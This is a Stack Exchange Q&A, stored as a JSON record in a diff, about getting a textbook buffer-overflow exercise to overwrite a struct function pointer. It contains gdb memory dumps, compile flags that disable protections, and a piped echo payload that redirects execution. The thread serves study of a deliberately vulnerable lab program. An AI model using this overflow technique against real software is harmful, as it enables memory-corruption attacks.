@@ -1,0 +1,63 @@
+{
+  "title": "Can't get buffer to overflow over function pointer",
+  "link": "https://reverseengineering.stackexchange.com/questions/14490/cant-get-buffer-to-overflow-over-function-pointer",
+  "content": "I cannot get this buffer overflow exploit to work for the life of me. The source code is here. It is from the book, Hacking the Art of Exploitation. The subject here is the below struct:\n\n```\nstruct user {\n   int uid;\n   int credits;\n   int highscore;\n   char name[100];\n   int (*current_game) ();\n};\n\n```\nThe idea is to overflow name[100] such that the address provided after the 100 letter A's will overwrite the address of the function pointer, entitled current_game.\n\nHowever, please see the below gdb readout:\n\n```\n[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��048e2c]\n56        printf(\"[You have %u credits] ->  \", player.credits);\n(gdb) x/40x player.name\n0x804c08c <player+12>:    0x41414141  0x41414141  0x41414141  0x41414141\n0x804c09c <player+28>:    0x41414141  0x41414141  0x41414141  0x41414141\n0x804c0ac <player+44>:    0x41414141  0x41414141  0x41414141  0x41414141\n0x804c0bc <player+60>:    0x41414141  0x41414141  0x41414141  0x41414141\n0x804c0cc <player+76>:    0x41414141  0x41414141  0x41414141  0x41414141\n0x804c0dc <player+92>:    0x41414141  0x41414141  0x41414141  0x41414141\n0x804c0ec <player+108>:   0x41414141  0x080490bb  0x65383430  0x00006332\n0x804c0fc:  0x00000000  0x00000000  0x00000000  0x00000000\n0x804c10c:  0x00000000  0x00000000  0x00000000  0x00000000\n0x804c11c:  0x00000000  0x00000000  0x00000000  0x00000000\n(gdb) x/5x player.current_game\n0x80490bb <pick_a_number>:    0x83e58955  0xec8318ec  0x9d2e680c  0xa2e80804\n0x80490cb <pick_a_number+16>: 0x83fffff4\n(gdb) print 6*16\n$2 = 96\n\n```\nI've placed the address of another function into player.name as noted by the [Name: A*100 ... line. Below this, you can see the memory layout, how there are indeed 100 A's in memory. However, after the final A, we see that the next memory spot is 0x080490bb and has not been overwritten, even though we see that the player.name buffer does indeed contain an overflow just prior. I've shown a printout of player.current_game afterwards to display that it is indeed at address 0x80490bb which is what we see in the dump directly after the last 0x41414141. I am baffled here.\n\nThanks.\n\nI am able to successfully cause a segmentation fault with the chars (such as 'A' or 'B'), however, when I do the A*100 followed by 08048e2c memory address which I am trying to jump execution to, the segfault happens, but the player.current_game function pointer address (which is right after the player.name buffer as shown above) is oddly [DEBUG] current_game pointer @ 0x34303830 rather than the address 08048e2c, which causes the segmentation fault since it can't execute 0x34303830. Additionally, I placed read/write watches on 0x804c0ec to see if I could find anything writing but was not successful in finding anything else.\n\n",
+  "votes": "3",
+  "answers": 1,
+  "views": "4k",
+  "tags": [
+    "linux",
+    "c",
+    "buffer-overflow"
+  ],
+  "user": "the_endian",
+  "time": "Jan 25, 2017 at 9:36",
+  "comments": [
+    {
+      "user": "Nordwald",
+      "text": "As far as I can tell, the exploit involves the following: 1. enter any name - 2. play any game - 3. change name to exploit string - 4. pick the same game again (so the pointer won't be reset). Can you confirm?",
+      "time": null
+    },
+    {
+      "user": "the_endian",
+      "text": "Definitely, that's how it's described in the book.",
+      "time": null
+    }
+  ],
+  "answers_data": [
+    {
+      "content": "I'm sorry, but this certainly works for me. Lets go through this step by step, shall we?\n\nI used your command line to compile the program:\n\n```\ngcc  -z execstack game_of_chance.c -fno-stack-protector -no-pie -m32 -o goc\n\n```\nI've done one small change though, I changed\n\n```\n#define DATAFILE \"/var/chance.data\" // File to store user data\n\n```\nto\n\n```\n#define DATAFILE \"chance.data\" // File to store user data\n\n```\nfor some peace of mind.\n\n\n\nAs you can see, I'm actually pretty bad at this. The only thing we need to remember is that we chose '1' at the game menu though.\n\nLets start by changing our name to overwrite the pointer:\n\n\n\nSomething happened! Shoudln't that also work with just 4x BBBB at the end? Nope! But why? My best guess: stack alignment. Let's check this out.\n\nIn game_of_choice.c I've changed\n\n```\nchar name[100];\n\n```\nto\n\n```\nchar name[128];\n\n```\nAnd tried the same with 128 times 'A':\n\nIt works. So it seems your problem was stack alignment\n\nThe standard value of -mpreferred-stack-boundary seems to be 4, meaning gcc is trying to create 16-byte aligned stack boundaries.\n\nThe program is reading a string from the command line. What we want is to pass the address 0x08048e2c in this string in a fashion is can be jumped too. The problem is that if we just write 08048e2c, we are actually passing 0x3038303438653263 (0 turns into 0x30, 8 -> 0x38, and so on each digit is a one byte number) as a value to the program. So we need to pass the actual bytes that make up the address.\n\nWhen we pass \\x2c\\x8e\\x04\\x08 in the string, we actually pass 0x5c7832635c7838655c7830345c3038, because it is still interpreted as a sequence of characters which are translated to byte values one by one.\n\nWhen we have a look at any ASCII table, we notice that \\x08 translates to the special backspace-character. We certainly can not include it in text.\n\nUsing perl -e or echo -e, we let the corresponding program know it should look out for escape sequences when it receives a string. So they actually output the 'real' byte values.\n\n```\necho -e '\\x2c\\x8e\\x04\\08'\n\n```\n",
+      "votes": "4",
+      "user": "Community",
+      "time": "Jun 17, 2020 at 9:54",
+      "is_accepted": true,
+      "comments": [
+        {
+          "user": "the_endian",
+          "text": "I too was able to over write it with Bs, although inconsistently (due to the stack alignment as you said, great catch!) however I have not yet been able to get it to execute the function code mentioned above but again this may be due to the stack alignment issue so let me play wit it some more. Was also going to make sure nothing else was writing to the address after the overflow was run. When I overflow with function address, it seems to disappear.",
+          "time": null
+        },
+        {
+          "user": "Nordwald",
+          "text": "Make sure to use the right return address in the name: neither \\x2c\\x8e\\x04\\08 nor 0x08048e2c are going to help you. You need the actual four bytes, since this escape sequences are not interpreted (e.g. '\\' results in \\x5c, ...). See output from echo -e '\\x2c\\x8e\\x04\\08'",
+          "time": null
+        },
+        {
+          "user": "the_endian",
+          "text": "You're onto something there! See my update above. Basically, the function pointer player.current_game is being overwritten with 0x34303830 which is ASCII for 0804, which is the first part of the address that contains the code I want to execute. For some reason, even when I write it in as plain 08048e2c it is still not being interpreted as an address, but instead it's interpreting the ASCII values of those numbers...",
+          "time": null
+        },
+        {
+          "user": "Nordwald",
+          "text": "This is because the program expects a series of chars rather than anything else (e.g. a string with escape sequences). So you'll have to provide the actual bytes (problematic, since \\x08 actually means 'backspace').",
+          "time": null
+        },
+        {
+          "user": "Nordwald",
+          "text": "echo -e '1  \n5  \nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x2c\\x8e\\x04\\x08  \n1' | ./goc",
+          "time": null
+        }
+      ]
+    }
+  ]
+}
